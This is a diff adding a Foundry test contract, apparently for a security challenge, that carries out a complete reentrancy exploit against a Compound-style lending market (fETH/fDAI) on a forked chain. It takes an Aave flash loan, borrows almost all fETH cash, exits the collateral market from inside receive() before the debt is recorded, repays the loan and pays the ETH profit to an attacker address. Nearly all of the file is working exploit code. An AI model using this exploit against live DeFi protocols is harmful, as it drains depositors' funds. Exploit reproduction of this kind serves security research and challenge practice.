@@ -1,0 +1,204 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.23;
+
+import "forge-std/Test.sol";
+
+interface IERC20Minimal {
+    function balanceOf(address) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IAaveV2LendingPool {
+    function flashLoan(
+        address receiverAddress,
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata modes,
+        address onBehalfOf,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+}
+
+interface IUniswapV2Router02 {
+    function swapETHForExactTokens(
+        uint256 amountOut,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256[] memory amounts);
+}
+
+interface IComptroller {
+    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
+    function exitMarket(address cToken) external returns (uint256);
+}
+
+interface IDelegator {
+    function implementation() external view returns (address);
+}
+
+interface ICEther {
+    function borrow(uint256 borrowAmount) external returns (uint256);
+    function getCash() external view returns (uint256);
+    function borrowBalanceStored(address account) external view returns (uint256);
+}
+
+interface ICErc20 {
+    function mint(uint256 mintAmount) external returns (uint256);
+    function redeem(uint256 redeemTokens) external returns (uint256);
+    function balanceOf(address) external view returns (uint256);
+}
+
+/// @notice Hypothesis: the fETH market still forwards full gas during borrow,
+/// which lets receive() exit the fDAI market before borrow storage is written.
+/// The callback unlocks the collateral, after which the flash-loaned DAI can be
+/// redeemed and the loan repaid while retaining borrowed ETH as native profit.
+contract Attempt1 is Test {
+    address constant STUDENT = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
+    uint256 constant FORK_BLOCK = 14_684_686;
+    uint256 constant EXPECTED_CHAIN_ID = 2401;
+    uint256 constant FLASH_DAI = 150_000_000e18;
+
+    IERC20Minimal constant DAI = IERC20Minimal(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+    IComptroller constant UNITROLLER = IComptroller(0xc54172e34046c1653d1920d40333Dd358c7a1aF4);
+    ICErc20 constant FDAI = ICErc20(0x7e9cE3CAa9910cc048590801e64174957Ed41d43);
+    ICEther constant FETH = ICEther(0xbB025D470162CC5eA24daF7d4566064EE7f5F111);
+    IAaveV2LendingPool constant AAVE_V2 = IAaveV2LendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
+    IUniswapV2Router02 constant UNISWAP_V2 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+
+    bool internal reentered;
+    uint256 internal exitCode;
+    uint256 internal borrowAmount;
+    uint256 internal premiumOwed;
+    uint256 internal ethSpentForPremium;
+    uint256 internal harnessStartBalance;
+
+    function setUp() public {
+        vm.createSelectFork("ch3", FORK_BLOCK);
+
+        vm.label(STUDENT, "StudentEOA");
+        vm.label(address(DAI), "DAI");
+        vm.label(address(UNITROLLER), "Unitroller");
+        vm.label(address(FDAI), "fDAI");
+        vm.label(address(FETH), "fETH");
+        vm.label(address(AAVE_V2), "AaveV2LendingPool");
+        vm.label(address(UNISWAP_V2), "UniswapV2Router");
+    }
+
+    function test_exploit() public {
+        uint256 start = STUDENT.balance;
+        uint256 fEthCash = FETH.getCash();
+        harnessStartBalance = address(this).balance;
+
+        console.log("CHAIN_ID:", block.chainid);
+        console.log("FORK_BLOCK:", block.number);
+        console.log("FETH_IMPLEMENTATION:", IDelegator(address(FETH)).implementation());
+        console.log("FETH_CASH:", fEthCash);
+        console.log("ATTACKER_NATIVE_BEFORE:", start);
+        console.log("HARNESS_NATIVE_BEFORE:", harnessStartBalance);
+
+        assertEq(block.chainid, EXPECTED_CHAIN_ID, "unexpected challenge chain id");
+        assertGt(fEthCash, 1 ether, "insufficient fETH cash on fork");
+
+        borrowAmount = fEthCash - 1 ether;
+        console.log("TARGET_BORROW_ETH:", borrowAmount);
+
+        address[] memory assets = new address[](1);
+        assets[0] = address(DAI);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = FLASH_DAI;
+
+        uint256[] memory modes = new uint256[](1);
+        modes[0] = 0;
+
+        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
+
+        console.log("REENTERED:", reentered);
+        console.log("EXIT_MARKET_CODE:", exitCode);
+        console.log("FETH_DEBT_POST:", FETH.borrowBalanceStored(address(this)));
+        console.log("ETH_SPENT_FOR_PREMIUM:", ethSpentForPremium);
+
+        uint256 harnessEndBalance = address(this).balance;
+        uint256 profit = harnessEndBalance - harnessStartBalance;
+        console.log("HARNESS_NATIVE_AFTER_FLASH:", harnessEndBalance);
+        console.log("REAL_PROFIT_NATIVE:", profit);
+
+        (bool ok,) = payable(STUDENT).call{value: profit}("");
+        require(ok, "native payout failed");
+
+        uint256 end = STUDENT.balance;
+        console.log("ATTACKER_NATIVE_AFTER:", end);
+        console.log("ATTACKER_NATIVE_DELTA:", end - start);
+
+        assertTrue(reentered, "borrow did not invoke receive()");
+        assertEq(exitCode, 0, "exitMarket failed during reentrancy");
+        assertEq(profit, borrowAmount - ethSpentForPremium, "unexpected ETH accounting");
+        assertGt(end, start, "native balance must strictly increase");
+    }
+
+    function executeOperation(
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,
+        address,
+        bytes calldata
+    ) external returns (bool) {
+        require(msg.sender == address(AAVE_V2), "bad flashloan caller");
+        require(assets.length == 1 && assets[0] == address(DAI), "unexpected asset");
+
+        premiumOwed = premiums[0];
+        console.log("FLASH_DAI:", amounts[0]);
+        console.log("FLASH_PREMIUM_DAI:", premiumOwed);
+
+        require(DAI.approve(address(FDAI), amounts[0]), "approve fDAI failed");
+        require(FDAI.mint(amounts[0]) == 0, "fDAI mint failed");
+
+        address[] memory markets = new address[](1);
+        markets[0] = address(FDAI);
+
+        uint256[] memory enterResults = UNITROLLER.enterMarkets(markets);
+        require(enterResults.length == 1 && enterResults[0] == 0, "enterMarkets failed");
+
+        require(FETH.borrow(borrowAmount) == 0, "fETH borrow failed");
+        require(FDAI.redeem(FDAI.balanceOf(address(this))) == 0, "fDAI redeem failed");
+
+        uint256 owed = amounts[0] + premiums[0];
+        uint256 daiBal = DAI.balanceOf(address(this));
+        console.log("DAI_AFTER_REDEEM:", daiBal);
+        console.log("AAVE_OWED_DAI:", owed);
+
+        if (daiBal < owed) {
+            uint256 shortfall = owed - daiBal;
+            console.log("DAI_SHORTFALL:", shortfall);
+
+            address[] memory path = new address[](2);
+            path[0] = WETH;
+            path[1] = address(DAI);
+
+            uint256[] memory swapAmounts = UNISWAP_V2.swapETHForExactTokens{value: address(this).balance}(
+                shortfall, path, address(this), block.timestamp
+            );
+            ethSpentForPremium = swapAmounts[0];
+            console.log("ETH_FOR_DAI_PREMIUM_SWAP:", ethSpentForPremium);
+        }
+
+        require(DAI.approve(address(AAVE_V2), owed), "approve Aave failed");
+        return true;
+    }
+
+    receive() external payable {
+        if (msg.sender != address(FETH) || reentered) {
+            return;
+        }
+
+        reentered = true;
+        console.log("REENTRANT_ETH_RECEIVED:", msg.value);
+
+        exitCode = UNITROLLER.exitMarket(address(FDAI));
+        console.log("REENTRANT_EXIT_CODE:", exitCode);
+        require(exitCode == 0, "exitMarket during reentrancy failed");
+    }
+}
